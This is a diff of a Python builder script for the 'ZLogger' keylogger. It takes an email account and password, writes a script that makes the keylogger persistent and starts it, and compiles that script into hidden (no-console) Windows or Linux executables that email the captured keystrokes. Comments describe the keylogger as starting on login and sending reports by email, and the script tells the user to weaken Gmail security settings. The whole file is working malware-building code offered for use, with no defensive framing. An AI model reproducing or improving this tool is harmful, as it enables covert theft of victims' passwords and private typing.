@@ -1,43 +1,45 @@
 #!/usr/bin/env python
-
-# Userspace remote keylogger for Linux, works with X, starts on user login, logs key stikes to a file and sends report by email.
-# By Zaid Sabih / Zaid Al Quraishi
-
-
-from subprocess import call
-from shutil import copyfile
-
-HEADER = """
-__________  .__                                     
-\____    /  |  |   ____   ____   ____   ___________ 
-  /     /   |  |  /  _ \ / ___\ / ___\_/ __ \_  __ \\
- /     /_   |  |_(  <_> ) /_/  > /_/  >  ___/|  | \/
-/_______ \  |____/\____/\___  /\___  / \___  >__|   
-        \/             /_____//_____/      \/       
-
- \n"""
-
-print(HEADER)
-
-email = raw_input("Email : ")
-password = raw_input("password : ")
-sleep_interval = raw_input("Send logs every (seconds) : ")
-file_name = raw_input("File Name : ")
+import argparse
+import subprocess
+import os
 
 
-with open("config.py",'w') as out:
-    out.write("#!/usr/bin/env python\n\n")
-    out.write("\nEMAIL = \"" + email + "\"")
-    out.write("\nPASSWORD = \"" + password + "\"")
-    out.write("\nFILE_NAME = \"" + file_name + "\"")
-    out.write("\nSLEEP_INTERVAL = " + sleep_interval)
+WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
 
-print("[+] Writeing python logger to source/" + file_name)
-copyfile("logger.py", "source/" + file_name)
+def get_arguments():
+    parser = argparse.ArgumentParser(description='ZLogger v2.0')
+    parser._optionals.title = "Optional Arguments"
+    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
+    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
+    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
 
-print("[+] Generating executable.")
-call("pyinstaller --onefile source/" + file_name, shell=True)
-print("\n[+] Executable is stored in dist/" + file_name)
+    required_arguments = parser.add_argument_group('Required Arguments')
+    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
+    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
+    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
+    return parser.parse_args()
+
+def create_keylogger(file_name, interval, email, password):
+    with open(file_name, "w+") as file:
+        file.write("import keylogger\n")
+        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
+        file.write("zlogger.become_persistent()\n")
+        file.write("zlogger.start()\n")
+
+def compile_for_windows(file_name):
+    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])
+
+def compile_for_linux(file_name):
+    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])
+
+arguments = get_arguments()
+create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)
+
+if arguments.windows:
+    compile_for_windows(arguments.out)
+
+if arguments.linux:
+    compile_for_linux(arguments.out)
 
 print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
 print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
